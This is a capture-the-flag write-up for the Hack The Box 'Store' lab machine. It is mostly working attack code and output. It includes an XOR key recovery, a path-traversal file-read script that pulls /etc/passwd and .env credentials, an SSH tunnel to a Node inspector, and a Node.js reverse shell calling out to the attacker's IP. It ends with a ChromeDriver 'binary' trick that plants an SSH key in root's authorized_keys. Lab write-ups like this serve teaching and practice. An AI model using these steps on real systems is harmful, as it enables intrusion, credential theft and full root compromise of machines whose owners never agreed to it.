---
icon: garage-open
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 142237.png
coverY: -25.003142677561282
---

# HTB-STORE(VL)

<figure><img src="../../../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Initial Port Scanning

I started by scanning the target for open ports using rustscan for speed:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ rustscan -a 10.122.22.19 --ulimit 5000 -- -A -sC -sV

PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 63
5000/tcp open  upnp          syn-ack ttl 63
5001/tcp open  commplex-link syn-ack ttl 63
5002/tcp open  rfe           syn-ack ttl 63
```

The scan revealed four open TCP ports:

* **Port 22** - SSH
* **Port 5000** - HTTP (Node.js)
* **Port 5001** - HTTP (Node.js)
* **Port 5002** - HTTP (Node.js)

Let's get more detailed information about these services:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ nmap -p 22,5000,5001,5002 -sCV 10.122.22.19

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 30:68:b8:a8:f5:47:ca:bf:1a:23:97:d5:4c:77:97:da (ECDSA)
|_  256 3f:83:9f:53:0a:49:db:00:d5:18:85:e9:2f:05:76:dd (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
5001/tcp open  http    Node.js (Express middleware)
|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
5002/tcp open  http    Node.js (Express middleware)
|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**

* The host is running Ubuntu 22.04 LTS (based on OpenSSH version)
* All ports show TTL of 63, indicating a Linux system one hop away
* Three identical web services running on Express.js

#### Web Application Analysis - Ports 5000/5001/5002

All three ports appear to host the same "Secure Encrypted Storage" application.

**Initial Web Exploration**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ curl -I http://10.122.22.19:5000

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1161
ETag: W/"489-WmtntEqn7sxOXR0efV6R4TvN9ws"
Date: Wed, 29 Oct 2025 02:30:38 GMT
Connection: keep-alive
```

The binary sequence in the page title decodes to "Military Grade" - likely referring to encryption.

**Application Features:**

1. **File Upload** (`/upload`) - Allows uploading files
2. **List Files** (`/list`) - Shows uploaded files
3. **View File** (`/file/<filename>`) - Downloads/views files

**Directory Enumeration**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ feroxbuster -u http://10.122.22.19:5000 --dont-extract-links -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

200      GET        1l       87w     1161c http://10.122.22.19:5000/
301      GET       10l       16w      179c http://10.122.22.19:5000/images
301      GET       10l       16w      173c http://10.122.22.19:5000/css
301      GET       10l       16w      173c http://10.122.22.19:5000/tmp
200      GET        1l       51w      807c http://10.122.22.19:5000/upload
200      GET        1l       65w     1509c http://10.122.22.19:5000/list
```

**Important Discovery:** The `/tmp` directory is accessible via HTTP!

**Understanding the Encryption Mechanism**

I created a test file to analyze the encryption:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ echo "this is a test" > test.txt
```

After uploading, I found:

* File available at `/file/test.txt` (decrypted)
* Same file at `/tmp/test.txt` (encrypted)

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ curl http://10.122.22.19:5000/tmp/test.txt -s | xxd

00000000: 3c05 5009 453e 3013 5968 195c 0911 5d    <.P.E>0.Yh.\..]
```

The encrypted file is the **same length** as the plaintext - suggesting a stream cipher (likely XOR).

### Vulnerability Discovery

#### Recovering the XOR Key

To recover the encryption key, I uploaded a known file and XORed the plaintext with ciphertext:

```python
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ python3

>>> import requests
>>> 
>>> # Get encrypted file
>>> resp = requests.get('http://10.122.22.19:5000/tmp/goku.png')
>>> enc = resp.content
>>> 
>>> # Read original plaintext
>>> with open('/home/sn0x/Pictures/goku.png', 'rb') as f:
...     pt = f.read()
>>> 
>>> # XOR to recover keystream
>>> keystream = [c ^ p for c, p in zip(enc, pt)]
>>> ''.join([chr(x) for x in keystream[:40]])
'Hm9zeWC38Hm9zeWC38Hm9zeWC38Hm9zeWC38Hm9z'
```

**Key Discovery:** The XOR key is `Hm9zeWC38` (9 characters, repeating)

Verification with another file:

```python
>>> resp = requests.get('http://10.122.22.19:5000/tmp/test.txt')
>>> enc = resp.content
>>> ''.join(chr(e ^ k) for e, k in zip(enc, keystream))
'this is a test\n'
```

Perfect! The same key works for all files.

#### Directory Traversal Discovery

Testing for path traversal vulnerabilities:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ feroxbuster -u http://10.122.22.19:5000/file/ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -s 200

200      GET       22l      186w     5593c http://10.122.22.19:5000/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

**Critical Finding:** Path traversal works with URL-encoded slashes!

However, the returned file is "encrypted" (actually XORed with the key, since it's reading an unencrypted system file).

#### Building the Arbitrary File Read Exploit

I created a Python script to automate file reading:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ cat file_read.py
```

```python
#!/usr/bin/env python3
import base64
import re
import requests
import sys
from itertools import cycle

if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} <host> <absolute path>")
    sys.exit()

host = sys.argv[1]
enc_path = sys.argv[2].replace('/', '%2f')

try:
    resp = requests.get(
        f'http://{host}:5000/file/..%2f..%2F..%2F..%2F..%2F..{enc_path}',
        timeout=0.5
    )
except requests.exceptions.ReadTimeout:
    print("<File Not Found>")
    sys.exit()

enc_b64 = re.search(
    r'data:application/octet-stream;charset=utf-8;base64,(.+?)"',
    resp.text
).group(1)

enc = base64.b64decode(enc_b64)
pt = ''.join(chr(e^k) for e, k in zip(enc, cycle(b"Hm9zeWC38")))
print(pt)
```

Testing the script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ chmod +x file_read.py

┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ ./file_read.py 10.122.22.19 /etc/hostname
store

┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ ./file_read.py 10.122.22.19 /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
dev:x:1001:1001:,,,:/home/dev:/bin/bash
```

### System Enumeration via File Read

#### Identifying the Web Application Process

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ ./file_read.py 10.122.22.19 /proc/self/environ | tr '\00' '\n'

USER=dev
npm_config_user_agent=npm/8.5.1 node/v12.22.9 linux x64 workspaces/false
HOME=/home/dev
npm_package_json=/home/dev/projects/store1/package.json
npm_lifecycle_script=nodemon --exec 'node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js'
PATH=/home/dev/projects/store1/node_modules/.bin:...
PWD=/home/dev/projects/store1
```

**Key Findings:**

* Process runs as user `dev`
* Application path: `/home/dev/projects/store1/`
* **Node.js is running with `--inspect` flag on 127.0.0.1:9229**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ ./file_read.py 10.122.22.19 /proc/self/cmdline | tr '\00' ' '
node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js
```

#### Extracting Application Source Code

**Reading .env file**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ ./file_read.py 10.122.22.19 /home/dev/projects/store1/.env

SFTP_URL=sftp://sftpuser:WidK52pWBtWQdcVC@localhost
SECRET=Hm9zeWC38
STORE_HOME=/home/dev/projects/store1
PORT=5000
```

**Credentials Found:** `sftpuser:WidK52pWBtWQdcVC`

**Reading start.js**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ ./file_read.py 10.122.22.19 /home/dev/projects/store1/start.js

require('dotenv').config();
const app = require('./app');

const server = app.listen(process.env.PORT, () => {
  console.log(`Express is running on port ${server.address().port}`);
});
```

**Reading routes/index.js**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ ./file_read.py 10.122.22.19 /home/dev/projects/store1/routes/index.js
```

The source reveals:

* Files are encrypted with XOR before storing in SFTP
* There's a TODO comment about using unique keys per user
* Path traversal vulnerability exists but has some normalization checks

### Initial Access - SSH as sftpuser

#### Validating SFTP Credentials

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ netexec ssh 10.122.22.19 -u sftpuser -p WidK52pWBtWQdcVC

SSH         10.122.22.19    22     10.122.22.19     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.122.22.19    22     10.122.22.19     [+] sftpuser:WidK52pWBtWQdcVC  Linux - Shell access!
```

Attempting SSH login:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ sshpass -p WidK52pWBtWQdcVC ssh sftpuser@10.122.22.19

This service allows sftp connections only.
Connection to 10.122.22.19 closed.
```

The account is restricted to SFTP only, but we can connect:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ sftp sftpuser@10.122.22.19
Password: WidK52pWBtWQdcVC

Connected to 10.122.22.19.
sftp> ls
files  
sftp> ls files
files/goku.png          files/test.txt
```

#### SSH Configuration Analysis

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ ./file_read.py 10.122.22.19 /etc/ssh/sshd_config
```

The config shows:

```
Match User sftpuser
        ForceCommand internal-sftp
        PasswordAuthentication yes
        ChrootDirectory /var/sftp
        AllowAgentForwarding no
        X11Forwarding no
```

**Critical Finding:** `AllowTcpForwarding` is NOT disabled for sftpuser!

#### Creating SSH Tunnel to Node Inspector

Since TCP forwarding is allowed, I can tunnel to the Node.js inspector:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ sshpass -p WidK52pWBtWQdcVC ssh sftpuser@10.122.22.19 -N -L 9229:127.0.0.1:9229
```

The connection hangs (expected with `-N` flag). Verifying the tunnel:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ sudo netstat -tnlp | grep 9229

tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN      112211/ssh
tcp6       0      0 ::1:9229                :::*                    LISTEN      112211/ssh
```

Perfect! The tunnel is active.

### Shell as dev - Node Inspector Exploitation

#### Connecting to V8 Inspector

With the tunnel established, I opened Chromium and navigated to `chrome://inspect`:

Before tunnel:

* No remote targets visible

After tunnel:

* Remote target appears: `file:///home/dev/projects/store1/start.js`

Clicking "inspect" opens Chrome DevTools with access to:

* Console
* Sources
* Memory
* Profiler

#### Getting Reverse Shell via Console

In the DevTools Console, I can execute arbitrary JavaScript. I grabbed a Node.js reverse shell:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.15.78", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

Starting listener:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ nc -lnvp 443
Listening on 0.0.0.0 443
```

Pasting the payload into the Console and hitting Enter:

```bash
Connection received on 10.122.22.19 46876
whoami
dev
```

#### Shell Upgrade

```bash
script /dev/null -c bash
# Ctrl+Z
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ stty raw -echo; fg
# Enter
reset
# Terminal type: screen

dev@store:~/projects/store1$
```

### Privilege Escalation to root

#### Enumeration

**Home Directory Structure**

```bash
dev@store:~/projects$ ls
store1  store2  store3
```

Comparing the three store directories:

```bash
dev@store:~/projects$ find store2 -type f | grep -v public/tmp | while read fn; do diff $fn store1/$fn || echo "$fn"; done
```

The only differences are:

* Port numbers (5000, 5001, 5002)
* Inspector ports (9229, 9230, 9231)

All three sites are essentially identical.

**Chrome Installation**

```bash
dev@store:/$ ls -la /opt/google/
chrome

dev@store:/$ ps auxww | grep -i chrome
root         758  0.0  0.3 33612408 12544 ?      Ssl  02:01   0:00 /root/chromedriver
```

**ChromeDriver is running as root!**

**Network Ports**

```bash
dev@store:/$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9230          0.0.0.0:*               LISTEN      1021/node           
tcp        0      0 127.0.0.1:9231          0.0.0.0:*               LISTEN      1008/node           
tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN      38310/node          
tcp        0      0 127.0.0.1:9515          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::5000                 :::*                    LISTEN      38310/node          
tcp6       0      0 :::5001                 :::*                    LISTEN      1021/node           
tcp6       0      0 :::5002                 :::*                    LISTEN      1008/node
```

**Port 9515** is the default ChromeDriver remote debugging port!

#### ChromeDriver Exploitation

Testing the ChromeDriver API:

```bash
dev@store:/$ curl localhost:9515/status
{"value":{"build":{"version":"110.0.5481.77"},"message":"ChromeDriver ready for new sessions.","os":{"arch":"x86_64","name":"Linux","version":"6.8.0-1040-aws"},"ready":true}}

dev@store:/$ curl localhost:9515/sessions
{"sessionId":"","status":0,"value":[]}
```

ChromeDriver is ready and has no active sessions.

**Exploitation Strategy**

ChromeDriver allows starting new sessions with custom binary paths. We can exploit this to run arbitrary commands as root.

**Creating the payload script:**

```bash
dev@store:/$ cat > /dev/shm/ssh.sh << 'EOF'
#!/bin/bash

mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d sn0x@htb" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh
EOF

dev@store:/$ chmod +x /dev/shm/ssh.sh
```

**Triggering execution via ChromeDriver:**

```bash
dev@store:/$ curl localhost:9515/session -d '{"capabilities": {"alwaysMatch": {"goog:chromeOptions": {"binary": "/dev/shm/ssh.sh"}}}}'

{"value":{"error":"unknown error","message":"unknown error: Chrome failed to start: exited normally.\n  (unknown error: DevToolsActivePort file doesn't exist)\n  (The process started from chrome location /dev/shm/ssh.sh is no longer running, so ChromeDriver is assuming that Chrome has crashed.)","stacktrace":"..."}}
```

The error is expected - our script isn't a valid Chrome binary. But it executed as root!

#### Root Access

```bash
┌──(sn0x㉿sn0x)-[~/HTB/STORE]
└─$ ssh -i ~/.ssh/id_ed25519 root@10.122.22.19

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1040-aws x86_64)

root@store:~#
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
